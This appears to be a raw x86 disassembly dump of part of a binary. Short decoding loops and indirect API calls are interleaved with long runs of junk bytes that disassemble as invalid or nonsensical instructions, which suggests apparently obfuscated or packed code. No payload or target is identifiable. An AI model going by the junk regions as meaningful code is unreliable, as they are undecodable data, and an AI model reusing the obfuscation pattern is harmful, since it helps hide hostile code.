  410bd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bd3:	outs   dx,BYTE PTR ds:[esi]
  410bd4:	adc    ecx,DWORD PTR [ecx-0x405ce2c7]
  410bda:	mov    ?,eax
  410bdc:	mov    bh,BYTE PTR [esi-0x58]
  410bdf:	pop    ebp
  410be0:	lods   eax,DWORD PTR ds:[esi]
  410be1:	cmc    
  410be2:	sub    BYTE PTR [ecx-0x23f410bd],al
  410be8:	mov    al,ds:0x31934c71
  410bed:	fldl2e 
  410bef:	rol    DWORD PTR [ebp+0x1d],1
  410bf2:	jmp    0xa3bb:0x6927d1d4
  410bf9:	in     eax,dx
  410bfa:	mov    edx,0x562452c8
  410bff:	cmp    eax,0xccd7fbf7
  410c04:	rol    BYTE PTR [ebp-0x1],0xa
  410c08:	popf   
  410c09:	dec    eax
  410c0a:	xchg   ebx,eax
  410c0b:	adc    al,0x12
  410c0d:	(bad)  
  410c0e:	mov    cl,0x31
  410c10:	mov    DWORD PTR [edi-0x186a1f64],ebx
  410c16:	xor    dh,BYTE PTR [edx+0x46]
  410c19:	dec    eax
  410c1a:	enter  0x1138,0xb0
  410c1e:	sub    esi,DWORD PTR [edx+0x503fe01b]
  410c24:	xor    al,0x4e
  410c26:	daa    
  410c27:	xor    al,BYTE PTR [esi]
  410c29:	push   0x6ba7f35f
  410c2e:	and    edi,edi
  410c30:	les    edx,FWORD PTR [ebp-0x62ceb8c4]
  410c36:	out    0xab,eax
  410c38:	push   edi
  410c39:	add    al,0x94
  410c3b:	mov    eax,0x3b1c125c
  410c40:	pop    edi
  410c41:	test   al,0x68
  410c43:	out    0x33,eax
  410c45:	bound  ebp,QWORD PTR [edx-0x63b49451]
  410c4b:	dec    eax
  410c4c:	cmp    eax,0xd4eeda6e
  410c51:	or     eax,0x7a0557ba
  410c56:	or     DWORD PTR [edi],edx
  410c58:	xchg   ecx,eax
  410c59:	stos   DWORD PTR es:[edi],eax
  410c5a:	inc    BYTE PTR [edx]
  410c5c:	gs jg  0x410c28
  410c5f:	adc    ebx,edi
  410c61:	mov    edx,0xce684c94
  410c66:	and    DWORD PTR [ebx-0x256266a2],esi
  410c6c:	xor    bh,BYTE PTR [ebp+0x20]
  410c6f:	arpl   di,dx
  410c71:	inc    eax
  410c72:	ret    0xa10a
  410c75:	jb     0x410c35
  410c77:	push   esi
  410c78:	cmp    eax,0xe4a7770a
  410c7d:	xlat   BYTE PTR ds:[ebx]
  410c7e:	push   es
  410c7f:	call   0xcaa5e943
  410c84:	or     eax,0xb16971dc
  410c89:	mov    ebp,edi
  410c8b:	and    bl,BYTE PTR [ebx-0x596eba1f]
  410c91:	pop    es
  410c92:	mov    al,BYTE PTR [edi+0x3b]
  410c95:	aad    0x79
  410c97:	scas   al,BYTE PTR es:[edi]
  410c98:	mov    dl,ch
  410c9a:	cmc    
  410c9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c9c:	aaa    
  410c9d:	inc    edi
  410c9e:	mov    esi,0xcd5beef
  410ca3:	sbb    dh,BYTE PTR [ecx]
  410ca5:	int    0x65
  410ca7:	mov    ds:0xc7f5d111,eax
  410cac:	inc    ebp
  410cad:	clc    
  410cae:	xor    DWORD PTR [ebp-0x3ff40764],eax
  410cb4:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  410cbb:	mov    eax,DWORD PTR [ebp-0x8]
  410cbe:	or     DWORD PTR ds:0x4336ef,0x3fd0
  410cc8:	mov    ecx,0x7510854
  410ccd:	mov    DWORD PTR ds:0x43362f,0x62c3
  410cd7:	push   esi
  410cd8:	xor    eax,ecx
  410cda:	or     esi,DWORD PTR ds:0x43362f
  410ce0:	mov    esi,0x32729b
  410ce5:	add    eax,esi
  410ce7:	jmp    0x410cfe
  410cec:	mov    dl,BYTE PTR [ebp-0x1]
  410cef:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  410cf3:	mov    DWORD PTR ds:0x43362f,0x530d
  410cfd:	inc    eax
  410cfe:	mov    DWORD PTR ds:0x43366b,0x3584
  410d08:	cmp    eax,0x40
  410d0b:	mov    DWORD PTR ds:0x43367f,0x3d5c
  410d15:	jb     0x410cec
  410d1b:	mov    eax,ds:0x43362f
  410d20:	add    eax,DWORD PTR ds:0x433703
  410d26:	mov    ds:0x43362f,eax
  410d2b:	mov    edx,DWORD PTR [ebp-0x8]
  410d2e:	mov    DWORD PTR ds:0x43373f,0x17
  410d38:	cmp    DWORD PTR ds:0x43373f,0x0
  410d3f:	je     0x410d94
  410d45:	cmp    DWORD PTR ds:0x43373f,0x4
  410d4c:	jne    0x410d69
  410d52:	push   DWORD PTR [ebp-0x20]
  410d55:	push   DWORD PTR [ebp-0x28]
  410d58:	push   DWORD PTR [ebp-0xc]
  410d5b:	push   DWORD PTR [ebp-0x1c]
  410d5e:	push   0x2fed
  410d63:	call   DWORD PTR ds:0x4123b0
  410d69:	cmp    DWORD PTR ds:0x43373f,0x5
  410d70:	jne    0x410d84
  410d76:	xor    eax,eax
  410d78:	xor    eax,DWORD PTR ds:0x43373f
  410d7e:	dec    eax
  410d7f:	mov    ds:0x43373f,eax
  410d84:	mov    eax,ds:0x43373f
  410d89:	dec    eax
  410d8a:	mov    ds:0x43373f,eax
  410d8f:	jmp    0x410d38
  410d94:	mov    eax,DWORD PTR [ebp-0xc]
  410d97:	add    DWORD PTR ds:0x433623,0x2cfa
  410da1:	xor    edx,ecx
  410da3:	sbb    DWORD PTR ds:0x43373b,0x4112
  410dad:	add    edx,esi
  410daf:	mov    DWORD PTR ds:0x4336b3,0x2f1c
  410db9:	cmp    edx,eax
  410dbb:	jmp    0x410f57
  410dc0:	adc    al,0x14
  410dc2:	in     al,0x8b
  410dc4:	in     al,0x6b
  410dc6:	jno    0x410d59
  410dc8:	aad    0x1d
  410dca:	dec    ebx
  410dcb:	add    ch,BYTE PTR [esi+ecx*4+0x21]
  410dcf:	xor    al,0x8c
  410dd1:	inc    edi
  410dd2:	jle    0x410e52
  410dd4:	icebp  
  410dd5:	jg     0x410e55
  410dd7:	jle    0x410d79
  410dd9:	jl     0x410dc5
  410ddb:	test   DWORD PTR [edx+0x78ddea3b],eax
  410de1:	aas    
  410de2:	mov    esi,0x7edeaa14
  410de7:	mov    ebp,db3
  410dea:	std    
  410deb:	je     0x410d8c
  410ded:	or     BYTE PTR [esi+0x476b3267],0x61
  410df4:	ins    DWORD PTR es:[edi],dx
  410df5:	loopne 0x410e25
  410df7:	mov    eax,0xcf86c5f8
  410dfc:	mov    ebp,0x81184d0a
  410e01:	test   al,0xce
  410e03:	push   cs
  410e04:	es xchg ecx,eax
  410e06:	retf   
  410e07:	aad    0x5a
  410e09:	js     0x410ddb
  410e0b:	fcmovbe st,st(7)
  410e0d:	pop    ecx
  410e0e:	into   
  410e0f:	xor    BYTE PTR [edx],ch
  410e11:	xor    eax,0x7be18034
  410e16:	gs scas al,BYTE PTR es:[edi]
  410e18:	loop   0x410e45
  410e1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e1b:	arpl   WORD PTR [edx+0x2d24e0cd],bp
  410e21:	aaa    
  410e22:	dec    ebx
  410e23:	cdq    
  410e24:	inc    edi
  410e25:	fidivr WORD PTR [ecx-0x8aaa9df]
  410e2b:	out    dx,al
  410e2c:	outs   dx,BYTE PTR ds:[esi]
  410e2d:	fwait
  410e2e:	xchg   esi,eax
  410e2f:	(bad)
  410e33:	xchg   ebx,eax
  410e34:	mov    esi,0x7cbf0edf
  410e39:	cwde   
  410e3a:	sbb    eax,0xb8b000e4
  410e3f:	outs   dx,DWORD PTR ds:[esi]
  410e40:	sbb    BYTE PTR [edi+0x72],bl
  410e43:	dec    eax
  410e44:	clc    
  410e45:	mov    edi,0x4b9a078c
  410e4a:	dec    ecx
  410e4b:	sbb    al,0xf7
  410e4d:	cwde   
  410e4e:	sub    al,BYTE PTR [ebx+0x31]
  410e51:	leave  
  410e52:	push   cs
  410e53:	pop    edx
  410e54:	xor    al,BYTE PTR [ebp+0x61187451]
  410e5a:	js     0x410e93
  410e5c:	sub    ah,0x63
  410e5f:	jnp    0x410e68
  410e61:	out    0xa4,al
  410e63:	push   0x1f3cc05f
  410e68:	and    esp,esp
  410e6a:	stc    
  410e6b:	retf   0x8a74
  410e6e:	adc    di,cx
  410e71:	jmp    0x410e3f
  410e73:	mov    ebx,0xf77d2ac9
  410e78:	mov    ah,0x35
  410e7a:	mov    ebx,0xcace4b2d
  410e7f:	push   0x7da1739d
  410e84:	bound  ebx,QWORD PTR [edx]
  410e86:	adc    eax,0xe30decdc
  410e8b:	and    BYTE PTR [ebx+ebp*2-0x34],ch
  410e8f:	stos   DWORD PTR es:[edi],eax
  410e90:	mov    al,0x9e
  410e92:	loop   0x410e31
  410e94:	push   ebp
  410e95:	add    ah,BYTE PTR [edx]
  410e97:	dec    esi
  410e98:	inc    ecx
  410e99:	les    ebp,FWORD PTR [eax-0x2f]
  410e9c:	cwde   
  410e9d:	or     bl,dh
  410e9f:	jle    0x410e9d
  410ea1:	and    ecx,esi
  410ea3:	(bad)  
  410ea4:	or     eax,0x6564c93
  410ea9:	pop    edx
  410eaa:	jge    0x410ebc
  410eac:	mov    esp,0xaf074a60
  410eb1:	or     DWORD PTR [edx],esp
  410eb3:	loopne 0x410e35
  410eb5:	dec    esi
  410eb6:	pop    ecx
  410eb7:	ss dec esp
  410eb9:	call   FWORD PTR [edx]
  410ebb:	xchg   esi,eax
  410ebc:	xchg   DWORD PTR [ecx+0x73301151],ebp
  410ec2:	loopne 0x410e87
  410ec4:	inc    eax
  410ec5:	dec    ecx
  410ec6:	es ins DWORD PTR es:[edi],dx
  410ec8:	lock dec esi
  410eca:	push   edx
  410ecb:	repz or al,0x41
  410ece:	and    bl,cl
  410ed0:	test   eax,esi
  410ed2:	jge    0x410e79
  410ed4:	das    
  410ed5:	jb     0x410f17
  410ed7:	add    al,0x6a
  410ed9:	pop    edx
  410eda:	push   edx
  410edb:	ret    0x2ecc
  410ede:	cmp    cl,BYTE PTR [edi-0x21]
  410ee1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ee2:	jns    0x410f58
  410ee4:	cmp    dh,BYTE PTR [edi]
  410ee6:	fwait
  410ee7:	out    dx,al
  410ee8:	mov    eax,cs
  410eea:	out    dx,al
  410eeb:	mov    ecx,DWORD PTR [ecx]
  410eed:	inc    ebx
  410eee:	pop    edx
  410eef:	aaa    
  410ef0:	mov    ch,BYTE PTR [ecx+0x69]
  410ef3:	cmp    ch,dl
  410ef5:	xor    esp,ebp
  410ef7:	hlt    
  410ef8:	add    ecx,esi
  410efa:	or     eax,0x48d39717
  410eff:	aad    0x13
  410f01:	jg     0x410f34
  410f03:	repnz mov ds:0x1b723236,al
  410f09:	xchg   esp,eax
  410f0a:	(bad)  
  410f0b:	cmc    
  410f0c:	adc    DWORD PTR [edx+0x35a3394f],eax
  410f12:	xchg   ebp,eax
  410f13:	jecxz  0x410f3e
  410f15:	repnz add ah,BYTE PTR [edx]
  410f18:	rol    DWORD PTR [ebx+0x2e32a82a],1
  410f1e:	sbb    DWORD PTR [eax-0x7196362e],ebx
  410f24:	add    BYTE PTR [ecx-0x4b2d2887],al
  410f2a:	aaa    
  410f2b:	and    eax,0xffffffab
  410f2e:	call   0x9a9e:0x5fa995a
  410f35:	cmp    DWORD PTR [esi],esp
  410f37:	addr16 jne 0x410ed6
  410f3a:	mov    edi,0xb81cf330
  410f3f:	jnp    0x410fb3
  410f41:	int3   
  410f42:	sbb    BYTE PTR [ecx+0x55],al
  410f45:	inc    edx
  410f46:	sbb    DWORD PTR [ebp-0x70],ecx
  410f49:	inc    ebp
  410f4a:	lods   eax,DWORD PTR ds:[esi]
  410f4b:	pop    ebp
  410f4c:	dec    edx
  410f4d:	sub    ebp,edi
  410f4f:	push   edx
  410f50:	xchg   ebx,eax
  410f51:	sub    al,BYTE PTR [eax+0x4339d487]
  410f57:	je     0x4111b4
  410f5d:	xor    eax,eax
  410f5f:	add    eax,DWORD PTR ds:0x43372f
  410f65:	sub    DWORD PTR ds:0x433733,eax
  410f6b:	push   ebx
  410f6c:	sub    eax,0x37b3
  410f71:	push   edi
  410f72:	mov    DWORD PTR ds:0x43367f,0x14
  410f7c:	cmp    DWORD PTR ds:0x43367f,0x0
  410f83:	je     0x410fda
  410f89:	cmp    DWORD PTR ds:0x43367f,0x2
  410f90:	jne    0x410fac
  410f96:	push   0x4336b3
  410f9b:	push   DWORD PTR [ebp-0x24]
  410f9e:	push   DWORD PTR [ebp-0x24]
  410fa1:	push   0x4a42
  410fa6:	call   DWORD PTR ds:0x4123b4
  410fac:	cmp    DWORD PTR ds:0x43367f,0x3
  410fb3:	jne    0x410fc6
  410fb9:	mov    edi,DWORD PTR ds:0x43367f
  410fbf:	dec    edi
  410fc0:	mov    DWORD PTR ds:0x43367f,edi
  410fc6:	xor    edi,edi
  410fc8:	or     edi,DWORD PTR ds:0x43367f
  410fce:	dec    edi
  410fcf:	mov    DWORD PTR ds:0x43367f,edi
  410fd5:	jmp    0x410f7c
  410fda:	mov    edi,DWORD PTR [ebp+0x8]
  410fdd:	mov    eax,0x8a3c
  410fe2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410fe7:	jmp    0x411183
  410fec:	mov    dh,0xd4
  410fee:	ja     0x411052
  410ff0:	jne    0x411053
  410ff2:	mov    bl,0xd0
  410ff4:	ins    DWORD PTR es:[edi],dx
  410ff5:	push   edi
  410ff6:	push   ss
  410ff7:	push   ecx
  410ff8:	in     al,dx
  410ff9:	fwait
  410ffa:	pop    ecx
  410ffb:	or     eax,0x7e7e450f
  411000:	icebp  
  411001:	jg     0x411081
  411003:	jle    0x41104c
  411005:	mov    ah,0x92
  411007:	push   esp
  411008:	or     DWORD PTR es:[ebx+0x5c405f9a],0x61
  411010:	add    ch,BYTE PTR [ebx]
  411012:	rcl    dh,cl
  411014:	push   ds
  411015:	xchg   esi,eax
  411016:	imul   esi,DWORD PTR ds:0x50774bbb,0x47ff796
  411020:	jecxz  0x410fac
  411022:	test   DWORD PTR [ebx+0x45],edx
  411025:	ret    
  411026:	mov    esi,0xc88bbe1a
  41102b:	fstp   QWORD PTR [ebx]
  41102d:	mov    bh,0x2
  41102f:	sub    BYTE PTR [esi+0x55],bh
  411032:	fisub  DWORD PTR [edi+ebx*2+0x2906a19e]
  411039:	dec    ebp
  41103a:	iret   
  41103b:	pop    esp
  41103c:	nop
  41103d:	mov    WORD PTR [ebx+0x72],ss
  411040:	xlat   BYTE PTR ds:[ebx]
  411041:	icebp  
  411042:	test   BYTE PTR [ebx+0x2f],al
  411045:	lahf   
  411046:	mov    ds,WORD PTR [ecx+0x31]
  411049:	pop    edx
  41104a:	fcom   DWORD PTR [edx-0x29]
  41104d:	sbb    esi,DWORD PTR [edi+0x256c71d]
  411053:	adc    ch,BYTE PTR [edx]
  411055:	int    0x24
  411057:	push   ebp
  411058:	dec    eax
  411059:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41105a:	cmc    
  41105b:	nop
  41105c:	jne    0x410ff4
  41105e:	sub    BYTE PTR [ecx],al
  411060:	mov    cl,0xdc
  411062:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411063:	mov    ebp,0x51986d5
  411068:	cld    
  411069:	xchg   ebp,eax
  41106a:	rcl    BYTE PTR [edi-0x3394ed5c],cl
  411070:	inc    edx
  411071:	adc    esi,DWORD PTR [edx+0x67]
  411074:	jno    0x411040
  411076:	es inc edx
  411078:	xchg   BYTE PTR [ebx-0x194d81c7],ch
  41107e:	jge    0x411085
  411080:	mov    cs,ecx
  411082:	jg     0x4110d1
  411084:	test   al,0x36
  411086:	mov    bl,0xe8
  411088:	and    ah,al
  41108a:	cli    
  41108b:	nop
  41108c:	mov    ah,0x25
  41108e:	cs pop ebp
  411090:	lods   al,BYTE PTR ds:[esi]
  411091:	or     edx,DWORD PTR [esp+edx*1-0x70]
  411095:	retf   0x1bac
  411098:	adc    DWORD PTR [esi-0x64154290],esi
  41109e:	(bad)  
  41109f:	popa   
  4110a0:	push   ss
  4110a1:	sbb    BYTE PTR ds:0x38035010,bl
  4110a7:	sbb    BYTE PTR [esp+ebx*8+0x73],0x50
  4110ac:	xchg   ebp,eax
  4110ad:	mov    ebx,0x39e57945
  4110b2:	sti    
  4110b3:	popf   
  4110b4:	mov    ds:0xf0b016b3,eax
  4110b9:	xchg   ecx,eax
  4110ba:	push   ebp
  4110bb:	into   
  4110bc:	scas   al,BYTE PTR es:[edi]
  4110bd:	sti    
  4110be:	outs   dx,BYTE PTR ds:[esi]
  4110bf:	scas   eax,DWORD PTR es:[edi]
  4110c0:	stc    
  4110c1:	sub    DWORD PTR [ebp+0x6d],ecx
  4110c4:	cli    
  4110c5:	outs   dx,BYTE PTR ds:[esi]
  4110c6:	ret    0xd77a
  4110c9:	mov    BYTE PTR cs:[eax+0x60],bh
  4110cd:	push   0xffffff90
  4110cf:	aad    0x3c
  4110d1:	(bad)  
  4110d2:	or     eax,0x8dc91fc2
  4110d7:	hlt    
  4110d8:	bound  esi,QWORD PTR [edx+0x618ae4b5]
  4110de:	adc    edx,DWORD PTR [esi+0x26]
  4110e1:	jmp    FWORD PTR [ebx-0x77cc8da1]
  4110e7:	pop    eax
  4110e8:	mov    ebx,0x1bf87747
  4110ed:	dec    ecx
  4110ee:	rcl    BYTE PTR [esi+0x7c02fc5],cl
  4110f4:	lods   eax,DWORD PTR ds:[esi]
  4110f5:	inc    edx
  4110f6:	inc    edx
  4110f7:	mov    eax,edx
  4110f9:	mov    bl,0xbe
  4110fb:	pushf  
  4110fc:	arpl   WORD PTR [edi-0x62d6b0fa],cx
  411102:	lods   al,BYTE PTR ds:[esi]
  411103:	xor    eax,0x384bd2f4
  411108:	jg     0x4110ad
  41110a:	sbb    eax,0x63241ed2
  41110f:	xchg   esi,eax
  411110:	aaa    
  411111:	fwait
  411112:	push   cs
  411113:	sub    al,0x82
  411115:	or     eax,0x160cfa4a
  41111a:	sub    eax,0xeb1cbc0e
  41111f:	or     al,0x2f
  411121:	popa   
  411122:	je     0x4110c7
  411124:	test   DWORD PTR [esi+0x8],edi
  411127:	sysret 
  411129:	add    BYTE PTR [esi-0xf117dbf],0x67
  411130:	jo     0x4110c9
  411132:	aaa    
  411133:	js     0x41112f
  411135:	leave  
  411136:	sahf   
  411137:	sub    ebp,DWORD PTR ds:0xce226062
  41113d:	js     0x4111b1
  41113f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411140:	imul   BYTE PTR [edi+0x3a95126e]
  411146:	je     0x411117
  411148:	add    ah,bl
  41114a:	rol    dh,1
  41114c:	jecxz  0x411107
  41114e:	retf   
  41114f:	outs   dx,BYTE PTR ds:[esi]
  411150:	mov    esi,?
  411152:	dec    eax
  411153:	js     0x411113
  411155:	mov    ebx,0xfc10ea24
  41115a:	cld    
  41115b:	sbb    al,0x3e
  41115d:	mov    fs,ecx
  41115f:	pusha  
  411160:	mov    ecx,0xf48b5c22
  411165:	sub    dl,0xdf
  411168:	sbb    al,0x88
  41116a:	or     eax,0xc0db5879
  41116f:	(bad)  
  411171:	jmp    0xd387:0x9bc01103
  411178:	out    0xe7,eax
  41117a:	jge    0x4111bf
  41117c:	cld    
  41117d:	arpl   WORD PTR [ebx],si
  41117f:	pop    ebp
  411180:	sub    esp,DWORD PTR [eax+esi*1]
  411183:	mov    edi,0x3b02
  411188:	add    ax,di
  41118b:	movzx  eax,ax
  41118e:	mov    DWORD PTR [ebp-0x14],eax
  411191:	mov    eax,DWORD PTR [ebp+0x8]
  411194:	movzx  eax,WORD PTR [eax+edx*4]
  411198:	xor    eax,0x8a3c
  41119d:	add    eax,edi
  41119f:	mov    edi,DWORD PTR [ebp-0x14]
  4111a2:	mov    BYTE PTR [ebp+edi*1-0x58],al
  4111a6:	mov    eax,DWORD PTR [ebp-0xc]
  4111a9:	inc    edx
  4111aa:	cmp    edx,eax
  4111ac:	jne    0x410f72
  4111b2:	pop    edi
  4111b3:	pop    ebx
  4111b4:	mov    eax,DWORD PTR [ebp-0x8]
  4111b7:	mov    edx,DWORD PTR [ebp+0x10]
  4111ba:	xor    eax,ecx
  4111bc:	add    eax,esi
  4111be:	mov    DWORD PTR [edx],eax
  4111c0:	mov    eax,DWORD PTR [ebp-0x8]
  4111c3:	xor    eax,ecx
  4111c5:	add    eax,esi
  4111c7:	mov    DWORD PTR [ebp+0x8],eax
  4111ca:	mov    eax,DWORD PTR [ebp+0x8]
  4111cd:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4111d1:	mov    dl,BYTE PTR [ebp-0x1]
  4111d4:	cmp    al,dl
  4111d6:	je     0x4113b5
  4111dc:	mov    eax,DWORD PTR [ebp+0x8]
  4111df:	jmp    0x41137b
  4111e4:	mov    ah,0x98
  4111e6:	adc    al,ch
  4111e8:	adc    dh,BYTE PTR [ebp+0x71]
  4111eb:	imul   ebx,ebp,0xfadabba7
  4111f1:	shl    BYTE PTR [edx+edi*2+0x7e7e428e],0xf1
  4111f9:	jg     0x411279
  4111fb:	jle    0x41121e
  4111fd:	out    dx,al
  4111fe:	loope  0x411224
  411200:	jge    0x41126b
  411202:	xchg   ecx,eax
  411203:	ss ret 
  411205:	mov    ss,WORD PTR [ebx+0x74]
  411208:	push   cs
  411209:	test   al,0xf1
  41120b:	idiv   BYTE PTR [ebp+0x700c2f95]
  411211:	aad    0x4c
  411213:	xor    BYTE PTR [edi+0x21],ch
  411216:	sbb    esi,DWORD PTR [edi+ebp*8]
  411219:	pmullw mm7,QWORD PTR [eax+0x42]
  41121d:	add    DWORD PTR [ecx+0x8f044ae],ebp
  411223:	fldcw  WORD PTR [edi]
  411225:	dec    esp
  411226:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411227:	mov    dh,0x8c
  411229:	xor    DWORD PTR [ecx-0x756d06ae],0x8
  411230:	and    DWORD PTR gs:[edx+0x4e],ebp
  411234:	cmp    eax,0x2bf041d2
  411239:	ins    DWORD PTR es:[edi],dx
  41123a:	push   esp
  41123b:	jns    0x4111f7
  41123d:	sub    al,0xdf
  41123f:	shl    BYTE PTR [esi-0x3f],1
  411242:	inc    ecx
  411243:	inc    ebx
  411244:	sbb    BYTE PTR [ecx],0xde
  411247:	loop   0x411248
  411249:	das    
  41124a:	mov    DWORD PTR [edi+0x31886e43],edi
  411250:	mov    ebx,0xbd26170f
  411255:	cmp    DWORD PTR [ebp+0x37],esp
  411258:	ds or  eax,0x20e4ed63
  41125e:	sub    eax,0x339e20bf
  411263:	push   es
  411264:	sub    al,dh
  411266:	or     cl,BYTE PTR [esi]
  411268:	ror    dl,1
  41126a:	mov    eax,ds:0xe01af939
  41126f:	loop   0x41121d
  411271:	aad    0x90
  411273:	lds    esp,FWORD PTR [edx-0x54ed845d]
  411279:	xlat   BYTE PTR ds:[ebx]
  41127a:	in     eax,0x2b
  41127c:	sbb    DWORD PTR [ebx+0x6b],ebp
  41127f:	call   0x42ceab6b
  411284:	ret    0x3028
  411287:	pop    ebp
  411288:	loope  0x4112d3
  41128a:	pop    edi
  41128b:	addr16 mov eax,ds:0xbaa9
  41128f:	fist   DWORD PTR [edx]
  411291:	out    dx,al
  411292:	leave  
  411293:	and    DWORD PTR [eax-0x70],0x426a0e4e
  41129a:	jns    0x4112fc
  41129c:	pop    ecx
  41129d:	inc    edx
  41129e:	int    0xc2
  4112a0:	in     eax,0x22
  4112a2:	shl    DWORD PTR [ebx+ebp*4+0x78],0x6f
  4112a7:	adc    dl,BYTE PTR [eax+0x653f0eea]
  4112ad:	mov    dh,0x18
  4112af:	stos   DWORD PTR es:[edi],eax
  4112b0:	jle    0x4112c6
  4112b2:	cdq    
  4112b3:	mov    ebp,0x3b7c05f4
  4112b8:	imul   ecx,DWORD PTR [edi+0x19466d6a],0xc024b27d
  4112c2:	cmp    dl,dl
  4112c4:	icebp  
  4112c5:	jo     0x411281
  4112c7:	pop    ebp
  4112c8:	ins    DWORD PTR es:[edi],dx
  4112c9:	sbb    BYTE PTR [ecx*2-0x6055bd3b],0x6
  4112d1:	in     eax,dx
  4112d2:	fwait
  4112d3:	in     al,0xa8
  4112d5:	adc    eax,0x5d801a64
  4112da:	xchg   ecx,eax
  4112db:	xchg   ebx,eax
  4112dc:	xlat   BYTE PTR ds:[ebx]
  4112dd:	or     DWORD PTR [ebx],esp
  4112df:	mov    ds,WORD PTR [ecx-0x6c]
  4112e2:	mov    ?,WORD PTR [edi+edi*8]
  4112e5:	add    eax,0xbd8ed50c
  4112ea:	push   esi
  4112eb:	es (bad) 
  4112ed:	(bad)  
  4112ee:	fwait
  4112ef:	jmp    0x161d:0x53a6b810
  4112f6:	adc    BYTE PTR [eax+0x2485bf14],bh
  4112fc:	(bad)  
  4112fd:	(bad)
  411300:	or     esi,DWORD PTR [ecx-0x6c]
  411303:	mov    ebp,0x30bddc7f
  411308:	add    ebp,ebp
  41130a:	cmp    al,0x4f
  41130c:	push   es
  41130d:	xchg   ebx,eax
  41130e:	scas   al,BYTE PTR es:[edi]
  41130f:	lock pop es
  411311:	push   ss
  411312:	adc    BYTE PTR [esi+0x26],dh
  411315:	jb     0x411320
  411317:	push   esi
  411318:	call   DWORD PTR [esi]
  41131a:	mov    esp,0x54eb203a
  41131f:	cli    
  411320:	inc    ebp
  411321:	or     cl,BYTE PTR [edx-0x43]
  411324:	(bad)  
  411325:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411326:	pop    ds
  411327:	inc    ebx
  411328:	imul   BYTE PTR [ebp+eiz*1+0x55f0a17]
  41132f:	pop    esp
  411330:	popf   
  411331:	mov    al,ds:0xe01cb915
  411336:	out    dx,al
  411337:	sti    
  411338:	lods   eax,DWORD PTR ds:[esi]
  411339:	clc    
  41133a:	pushf  
  41133b:	or     BYTE PTR [eax+0x23],al
  41133e:	push   esi
  41133f:	out    dx,al
  411340:	sti    
  411341:	mov    bh,cl
  411343:	into   
  411344:	clc    
  411345:	pop    es
  411346:	mov    edi,0x386c7a68
  41134b:	repz lahf 
  41134d:	rcl    DWORD PTR ss:[edx],1
  411350:	retf   0x15d2
  411353:	(bad)  
  411354:	bsr    esp,DWORD PTR [ebp+0x3f2adfb5]
  41135b:	scas   eax,DWORD PTR es:[edi]
  41135c:	jp     0x4112f9
  41135e:	fsubp  st(4),st
  411360:	fistp  WORD PTR [ebx+0x1]
  411363:	stc    
  411364:	pop    edx
  411365:	test   al,0xe6
  411367:	pop    ss
  411368:	xchg   ecx,eax
  411369:	int    0xa6
  41136b:	jae    0x41131d
  41136d:	repnz inc ebx
  41136f:	js     0x4113a1
  411371:	not    DWORD PTR [ebp+0x1d671f74]
  411377:	(bad)  
  411378:	push   ss
  411379:	push   0xffffffab
  41137b:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  41137f:	mov    edx,DWORD PTR [ebp+0xc]
  411382:	cmp    al,BYTE PTR [edx]
  411384:	jne    0x411713
  41138a:	mov    eax,DWORD PTR [ebp-0x8]
  41138d:	mov    edx,DWORD PTR [ebp+0xc]
  411390:	movsx  edx,BYTE PTR [edx]
  411393:	xor    eax,ecx
  411395:	add    eax,esi
  411397:	cmp    edx,eax
  411399:	je     0x41156b
  41139f:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4113a6:	lea    eax,[ebp-0x18]
  4113a9:	mov    DWORD PTR [ebp-0x14],eax
  4113ac:	mov    eax,DWORD PTR [ebp-0x14]
  4113af:	add    DWORD PTR [eax],0x705fa8f
  4113b5:	mov    eax,DWORD PTR [ebp-0x10]
  4113b8:	mov    edx,DWORD PTR [ebp+0x8]
  4113bb:	xor    eax,ecx
  4113bd:	lea    eax,[eax+edx*1+0x32729b]
  4113c4:	mov    DWORD PTR [ebp+0x8],eax
  4113c7:	jmp    0x411563
  4113cc:	sub    DWORD PTR [esi-0x26],ebx
  4113cf:	sub    al,0x69
  4113d1:	test   al,0xe9
  4113d3:	pop    ebx
  4113d4:	cld    
  4113d5:	add    DWORD PTR [edx-0x44406d5f],ecx
  4113db:	xor    al,0x1
  4113dd:	inc    eax
  4113de:	jle    0x41145e
  4113e0:	icebp  
  4113e1:	jg     0x411461
  4113e3:	jle    0x411442
  4113e5:	lods   al,BYTE PTR ds:[esi]
  4113e6:	cwde   
  4113e7:	and    cl,BYTE PTR gs:[ebx]
  4113ea:	sbb    cl,BYTE PTR [edi+0x4e]
  4113ed:	push   esi
  4113ee:	ds pushf 
  4113f0:	or     edi,DWORD PTR [edi]
  4113f2:	xchg   edi,eax
  4113f3:	sub    al,0xbd
  4113f5:	xor    al,BYTE PTR [eax]
  4113f7:	jmp    0x411387
  4113f9:	or     BYTE PTR [ecx-0x6724c24c],dl
  4113ff:	push   ss
  411400:	mov    eax,ds:0x5335a584
  411405:	push   cs
  411406:	inc    edx
  411407:	xor    cl,BYTE PTR ds:0x316c0114
  41140d:	jne    0x4113e2
  41140f:	stc    
  411410:	lods   eax,DWORD PTR ds:[esi]
  411411:	push   0xffffffd1
  411413:	leave  
  411414:	(bad)  
  411415:	jmp    0x21ed37cd
  41141a:	xor    dl,BYTE PTR [ebx-0x4b]
  41141d:	adc    ebx,DWORD PTR [esi]
  41141f:	sbb    DWORD PTR [esi+eax*4-0x53358289],ecx
  411426:	cs sbb eax,0xdb3aa89e
  41142c:	pop    esi
  41142d:	or     bl,bl
  41142f:	call   0x77af:0x41f9c7cd
  411436:	aas    
  411437:	mov    ebp,0x55b8e60d
  41143c:	add    al,0xff
  41143e:	loope  0x411415
  411440:	push   eax
  411441:	pop    ebp
  411442:	aaa    
  411443:	and    eax,0x1274bc48
  411448:	nop
  411449:	push   es
  41144a:	sbb    edi,eax
